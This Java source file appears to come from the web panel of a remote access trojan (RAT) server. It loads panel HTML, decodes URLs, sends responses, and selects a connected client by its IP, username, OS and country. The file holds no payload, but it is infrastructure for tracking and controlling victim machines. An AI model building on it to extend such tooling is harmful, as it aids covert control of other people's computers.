package electron.web;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.net.URI;
import java.net.URL;
import java.nio.charset.StandardCharsets;

import electron.RAT_server;
import electron.networking.NetData;
import electron.networking.SocketHandler;
import electron.utils.logger;

public class WebUtils {

	public static String getResource(String filename) {
		URL url = RAT_server.class.getResource("/resources/" + filename);
		try {
			BufferedReader reader = new BufferedReader(new InputStreamReader(url.openStream()));
			String line;
			String inf = "";
			while ((line = reader.readLine()) != null) {
				inf = inf + line;
			}
			reader.close();
			return inf;
		} catch (IOException e) {
			logger.error("[electron.web.WebUtils.getResource()]: error loading resource(" + filename + "). Message: "
					+ e.getMessage());
			return "<html><body><h1>Error loading HTML data. Message: " + e.getMessage()
					+ "</h1><p>Generated in [electron.web.WebUtils.getResource()]</p></body></html>";
		}
	}

	/**
	 * Get formatted input url
	 * 
	 * @param exchange
	 * @return url or "/" if error will happen
	 */
	public static String getUrl(com.sun.net.httpserver.HttpExchange exchange) {
		URI uri = exchange.getRequestURI();
		String request = uri.toString();
		try {
			// Format URI to UTF8
			request = java.net.URLDecoder.decode(request, StandardCharsets.UTF_8.name());
			return request;
		} catch (UnsupportedEncodingException e) {
			// not going to happen - value came from JDK's own StandardCharsets
			logger.warn("[electron.web.WebUtils.getUrl]: Error decoding incoming url.");
			return "/";
		}
	}

	/**
	 * Send answer to browser
	 * 
	 * @param exchange - client info
	 * @param response - data to send
	 * @param code     - HTTP code
	 * @throws IOException
	 */
	public static void sendResponse(com.sun.net.httpserver.HttpExchange exchange, String response, int code) {
		try {
			exchange.sendResponseHeaders(code, response.getBytes().length);
			OutputStream outputStream = exchange.getResponseBody();
			outputStream.write(response.getBytes());
			outputStream.close();
			exchange.close();
		} catch (IOException e) {
			logger.warn("[electron.web.WebUtils.sendResponse]: " + e.getMessage());
		}
	}

	public static SocketHandler defineHandler(String url) {
		if (!url.contains("?socket=")) {
			return null;
		}
		String[] spl = url.split("\\?socket=");
		String request = spl[1];
		if (request.contains("&")) {
			request = request.split("&")[0];
		}
		if (request.equalsIgnoreCase("null") || NetData.getClients().isEmpty()) {
			return null;
		}
		String[] components = request.split(",");
		String ip = components[0];
		String user = components[1];
		String os = components[2];
		String country = components[3];
		String isNative = components[4];
		String robotstate = components[5];
		for (SocketHandler handler : NetData.getClients()) {
			if (handler.getInfo() == null) {
				continue;
			}
			// Username can contains non-english letters
			int compareCounter = 0;
			if (handler.getInfo().getAddress().equalsIgnoreCase(ip)) {
				compareCounter++;
			}
			if (handler.getInfo().getUsername().equalsIgnoreCase(user)) {
				compareCounter++;
			}
			if (handler.getInfo().getOs().equalsIgnoreCase(os)) {
				compareCounter++;
			}
			if (handler.getInfo().getCountry().equalsIgnoreCase(country)) {
				compareCounter++;
			}
			if (handler.getInfo().getNativeimage().equalsIgnoreCase(isNative)) {
				compareCounter++;
			}
			if (compareCounter >= 4) {
				return handler;
			}
		}
		return null;
	}


}
